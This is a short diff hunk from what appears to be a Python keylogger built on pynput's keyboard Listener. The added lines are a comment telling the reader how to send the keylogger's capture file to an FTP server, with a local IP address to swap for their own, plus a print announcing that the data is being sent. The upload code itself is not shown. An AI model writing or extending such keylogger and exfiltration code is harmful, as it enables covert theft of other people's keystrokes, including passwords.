@@ -22,6 +22,9 @@ with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
     listener.join()
 
 '''
+if you want to send your key logger file to any if using ftp server you can use this below code in place of 192.168.0.4 replace it with your own
+ip address
+
 print("\n connecting to the ftp and sending the data....")
 
 
